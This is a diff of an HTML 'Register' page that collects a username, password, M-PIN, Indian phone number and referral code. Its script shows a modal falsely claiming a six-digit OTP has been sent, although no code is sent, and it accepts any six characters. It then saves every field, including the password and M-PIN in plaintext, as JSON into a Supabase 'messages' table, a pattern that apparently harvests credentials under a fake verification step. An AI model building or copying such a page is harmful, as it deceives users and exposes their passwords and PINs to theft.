@@ -3,44 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign Up</title>
+    <title>Register</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
-    <div class="bg-white p-8 rounded-2xl shadow-md w-full max-w-md">
-        <h2 class="text-2xl font-bold mb-6 text-center">Sign Up</h2>
+<body class="bg-gray-50 min-h-screen flex items-center justify-center p-4">
+    <div class="w-full max-w-md bg-white p-6 sm:p-8 rounded-3xl shadow-sm">
+        <h1 class="text-2xl font-semibold text-emerald-600 mb-6 flex items-center">
+            <span class="mr-2 cursor-pointer">&lt;</span> Register
+        </h1>
         <form id="signupForm" class="space-y-4">
             <div>
-                <label class="block text-sm font-medium text-gray-700">Username</label>
-                <input type="text" id="username" required class="w-full mt-1 p-2 border rounded-lg">
+                <div class="relative flex items-center">
+                    <span class="absolute left-4 text-gray-400">👤</span>
+                    <input type="text" id="username" placeholder="Username" required class="w-full pl-12 pr-4 py-3 bg-gray-50 border border-gray-100 rounded-full text-gray-800 focus:outline-none focus:border-emerald-500">
+                </div>
             </div>
             <div>
-                <label class="block text-sm font-medium text-gray-700">Password</label>
-                <input type="password" id="password" required class="w-full mt-1 p-2 border rounded-lg">
+                <div class="relative flex items-center">
+                    <span class="absolute left-4 text-gray-400">🔒</span>
+                    <input type="password" id="password" placeholder="Password" required class="w-full pl-12 pr-4 py-3 bg-gray-50 border border-gray-100 rounded-full text-gray-800 focus:outline-none focus:border-emerald-500">
+                </div>
             </div>
             <div>
-                <label class="block text-sm font-medium text-gray-700">M-PIN</label>
-                <input type="password" id="mpin" maxlength="6" required class="w-full mt-1 p-2 border rounded-lg">
+                <div class="relative flex items-center">
+                    <span class="absolute left-4 text-gray-400">🔒</span>
+                    <input type="password" id="mpin" placeholder="M-PIN" required class="w-full pl-12 pr-4 py-3 bg-gray-50 border border-gray-100 rounded-full text-gray-800 focus:outline-none focus:border-emerald-500">
+                </div>
             </div>
             <div>
-                <label class="block text-sm font-medium text-gray-700">Phone</label>
-                <input type="tel" id="phone" required class="w-full mt-1 p-2 border rounded-lg">
+                <div class="relative flex items-center">
+                    <span class="absolute left-4 text-gray-400">+91</span>
+                    <input type="tel" id="phone" placeholder="Phone" required class="w-full pl-16 pr-4 py-3 bg-gray-50 border border-gray-100 rounded-full text-gray-800 focus:outline-none focus:border-emerald-500">
+                </div>
             </div>
             <div>
-                <label class="block text-sm font-medium text-gray-700">Referral Code</label>
-                <input type="text" id="referral" class="w-full mt-1 p-2 border rounded-lg">
+                <div class="relative flex items-center">
+                    <span class="absolute left-4 text-gray-400">🔗</span>
+                    <input type="text" id="referral" placeholder="Referral Code" class="w-full pl-12 pr-4 py-3 bg-gray-50 border border-gray-100 rounded-full text-gray-800 focus:outline-none focus:border-emerald-500">
+                </div>
             </div>
-            <button type="submit" class="w-full bg-green-600 text-white py-2 rounded-lg font-semibold hover:bg-green-700 mt-4">Sign Up</button>
+            <button type="submit" class="w-full py-4 bg-emerald-600 hover:bg-emerald-700 text-white font-medium rounded-full shadow-lg transition duration-200 mt-6">
+                Sign Up
+            </button>
         </form>
     </div>
 
     <!-- OTP Modal -->
-    <div id="otpModal" class="fixed inset-0 bg-black bg-opacity-50 hidden flex items-center justify-center p-4">
-        <div class="bg-white p-6 rounded-2xl shadow-md w-full max-w-sm text-center">
-            <h3 class="text-xl font-bold mb-4">Enter 6-Digit OTP</h3>
-            <input type="text" id="otpInput" maxlength="6" class="w-full p-2 border rounded-lg text-center text-xl tracking-widest mb-4 font-bold" placeholder="000000">
-            <button onclick="verifyOtp()" class="w-full bg-blue-600 text-white py-2 rounded-lg font-semibold hover:bg-blue-700">Submit</button>
+    <div id="otpModal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center p-4">
+        <div class="bg-white rounded-3xl p-8 max-w-sm w-full text-center">
+            <h2 class="text-xl font-bold text-gray-800 mb-2">OTP Sent</h2>
+            <p class="text-sm text-gray-500 mb-6" id="otpSubtext">A 6-digit code has been sent</p>
+            <div class="flex justify-center gap-2 mb-6">
+                <input type="text" maxlength="6" id="otpInput" class="w-full text-center text-2xl tracking-widest py-3 bg-gray-50 border border-gray-200 rounded-2xl focus:outline-none focus:border-emerald-500">
+            </div>
+            <button onclick="verifyOtp()" class="w-full py-4 bg-emerald-600 text-white font-medium rounded-full shadow-md">
+                Verify OTP
+            </button>
         </div>
     </div>
 
@@ -51,7 +70,7 @@
 
         let pendingUserData = {};
 
-        document.getElementById('signupForm').addEventListener('submit', (e) => {
+        document.getElementById('signupForm').addEventListener('submit', function(e) {
             e.preventDefault();
             pendingUserData = {
                 username: document.getElementById('username').value,
@@ -60,15 +79,13 @@
                 phone: document.getElementById('phone').value,
                 referral: document.getElementById('referral').value
             };
-            document.getElementById('otpModal').classList.remove('hidden');
+            document.getElementById('otpSubtext').innerText = 'A 6-digit code has been sent to +91 ' + pendingUserData.phone.slice(-10);
+            document.getElementById('otpModal').style.display = 'flex';
         });
 
         async function verifyOtp() {
             const otp = document.getElementById('otpInput').value;
             if (otp.length === 6) {
-                alert('Verification Successful');
-                document.getElementById('otpModal').classList.add('hidden');
-                
                 const { error } = await supabase
                     .from('messages')
                     .insert([{ content: JSON.stringify(pendingUserData) }]);
@@ -77,11 +94,13 @@
                     alert('Error saving data: ' + error.message);
                 } else {
                     alert('Data saved successfully!');
+                    document.getElementById('otpModal').style.display = 'none';
                     document.getElementById('signupForm').reset();
                 }
             } else {
                 alert('Please enter a valid 6-digit OTP.');
             }
         }
-    </script></body>
+    </script>
+</body>
 </html>
